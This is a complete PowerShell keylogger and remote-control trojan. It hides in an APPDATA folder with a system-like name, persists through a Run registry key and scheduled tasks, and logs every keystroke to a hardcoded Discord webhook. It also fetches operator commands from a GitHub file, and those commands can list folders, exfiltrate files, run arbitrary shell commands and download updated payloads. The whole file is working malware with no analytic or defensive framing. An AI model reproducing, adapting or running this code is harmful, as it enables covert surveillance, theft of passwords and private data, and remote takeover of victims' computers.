param([switch]$Test)
$ErrorActionPreference = "SilentlyContinue"

# ===================== CONFIG =====================
$hook    = "https://discord.com/api/webhooks/1574502039323545742/FGJ91Pysy7zdQwD64rLOfrSyMa9-c5o-g8_29n5sEqzLr2KS96o9sWrPx5Zp7uY3ukUt"
$cmdUrl  = "https://raw.githubusercontent.com/Capyvests/office-365/main/cmd.txt"
$boot    = "https://raw.githubusercontent.com/Capyvests/office-365/main/k.ps1"
$shutSrc = "https://raw.githubusercontent.com/Capyvests/office-365/main/shut.ps1"
# ==================================================

$dir  = "$env:APPDATA\Microsoft\WinSvc"
$self = "$dir\k.ps1"
$log  = "$dir\svc.log"
$posF = "$dir\pos.txt"
$shut = "$dir\shut.ps1"
$tr   = "powershell -w hidden -ep bypass -f `"$self`""
$trS  = "powershell -w hidden -ep bypass -f `"$shut`""

$mtx = New-Object Threading.Mutex($false, "WinSvcMtx")
if (-not $mtx.WaitOne(0)) { exit }

New-Item -ItemType Directory $dir -Force | Out-Null
if ($PSCommandPath -and $PSCommandPath -ne $self) { Copy-Item $PSCommandPath $self -Force }
if (-not (Test-Path $self)) { iwr $boot -OutFile $self }
if (-not (Test-Path $posF)) { Set-Content $posF "0" }
$pos = [int](Get-Content $posF)

if (-not $Test) {
  Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SysSvc -Value $tr
  schtasks /create /tn SysSvc   /tr $tr  /sc onlogon      /f 2>$null
  schtasks /create /tn SysSvcW  /tr $tr  /sc minute /mo 5 /f 2>$null
  if (-not (Test-Path $shut)) { iwr $shutSrc -OutFile $shut }
  schtasks /create /tn SysSvcS1 /tr $trS /sc onevent /ec System /mo "*[System/EventID=6006]" /f 2>$null
  schtasks /create /tn SysSvcS2 /tr $trS /sc onevent /ec System /mo "*[System/EventID=1074]" /f 2>$null
}

function Send($t) {
  if (-not $t) { return }
  foreach ($i in 0..([Math]::Ceiling($t.Length / 350) - 1)) {
    $c = $t.Substring($i * 350, [Math]::Min(350, $t.Length - $i * 350))
    $b = @{ content = "``````$c``````" } | ConvertTo-Json
    try { Invoke-RestMethod $hook -Method Post -Body $b -ContentType "application/json" -TimeoutSec 8 } catch {}
  }
}

function Flush {
  if (-not (Test-Path $log)) { return }
  $a = Get-Content $log -Raw
  if (-not $a -or $a.Length -le $pos) { return }
  Send "[k] " + $a.Substring($pos)
  $pos = $a.Length
  if ($a.Length -gt 200000) {
    $a = $a.Substring($a.Length - 100000)
    Set-Content $log $a -NoNewline
    $pos = $a.Length
  }
  Set-Content $posF $pos
}

function Uninstall {
  Send "[i] UNINSTALL — a limpar"
  foreach ($t in "SysSvc","SysSvcW","SysSvcS1","SysSvcS2") { schtasks /delete /tn $t /f 2>$null }
  Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SysSvc 2>$null
  Start-Process powershell -w hidden -ArgumentList "-ep bypass -c Start-Sleep 4; Remove-Item -Recurse -Force '$dir'"
  exit
}

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class K { [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v); }
"@
$map  = @{ 8='[BK]'; 9='[TAB]'; 13="`n"; 32=' '; 46='[DEL]'; 27='[ESC]' }
$prev = New-Object 'bool[]' 256
$logOn = $true
$ultimo = ""
$tUlt   = Get-Date

while ($true) {
  try {
    $c = (Invoke-WebRequest "$cmdUrl`?v=$([DateTime]::UtcNow.Ticks)" -UseBasicParsing -TimeoutSec 8).Content.Trim()
    if ($c -and $c -ne $ultimo) {
      $ultimo = $c
      foreach ($l in ($c -split "`n")) {
        $l = $l.Trim(); if (-not $l) { continue }
        try {
          switch -Regex ($l) {
            '^log off'      { $logOn = $false; Send "[i] log OFF" }
            '^log on'       { $logOn = $true;  Send "[i] log ON" }
            '^dump$'        { Flush; Send "[i] dump concluido" }
            '^info$'        { Send "[i] info`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME`nOS: $((Get-CimInstance Win32_OperatingSystem).Caption)`nUptime: $((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime)`nIP: $((Get-NetIPAddress -AddressFamily IPv4 | ? {$_.IPAddress -notlike '127.*'} | Select -First 1).IPAddress)" }
            '^ls (.+)'      { Send "[i] ls $($matches[1])`n$((Get-ChildItem $matches[1] | Select -First 40 Name,Length | Out-String))" }
            '^get (.+)'     { $f=$matches[1]; $f2="$env:TEMP\g.txt"; Get-Content $f -Raw | Set-Content $f2 -Encoding UTF8; curl.exe -s -F "content=**get** $f" -F "files[0]=@$f2" $hook }
            '^sh (.+)'      { Send "[i] sh`n$((Invoke-Expression $matches[1] 2>&1 | Out-String))" }
            '^shut$'        { & $shut; Send "[i] teste de encerramento" }
            '^webhook (.+)' { $hook = $matches[1]; Send "[i] webhook alterado" }
            '^update$'      { Send "[i] update"; iwr $boot -OutFile $self; iwr $shutSrc -OutFile $shut; Start-Process powershell -w hidden -ArgumentList "-ep bypass -f `"$self`""; exit }
            '^uninstall$'   { Uninstall }
            default         { Send "[i] ? $l" }
          }
        } catch { Send "[e] $l -> $_" }
      }
    }
  } catch {}

  if ($logOn) {
    Start-Sleep -Milliseconds 12
    for ($k = 8; $k -lt 256; $k++) {
      $d = ([K]::GetAsyncKeyState($k) -band 0x8000) -ne 0
      if ($d -and -not $prev[$k]) {
        $ch = $null
        if ($map.ContainsKey($k)) { $ch = $map[$k] }
        elseif ($k -ge 32 -and $k -le 126) {
          $ch = [char]$k
          if ((([K]::GetAsyncKeyState(0x10) -band 0x8000) -ne 0) -bxor [Console]::CapsLock) {
            if ([char]::IsLetter($ch)) { $ch = [char]::ToUpper($ch) }
          }
        }
        if ($ch) { Add-Content $log $ch -NoNewline; $tUlt = Get-Date }
      }
      $prev[$k] = $d
    }
  } else { Start-Sleep -Milliseconds 800 }

  if ($logOn -and ((Get-Date) - $tUlt).TotalSeconds -gt 20) { Flush; $tUlt = Get-Date }
}
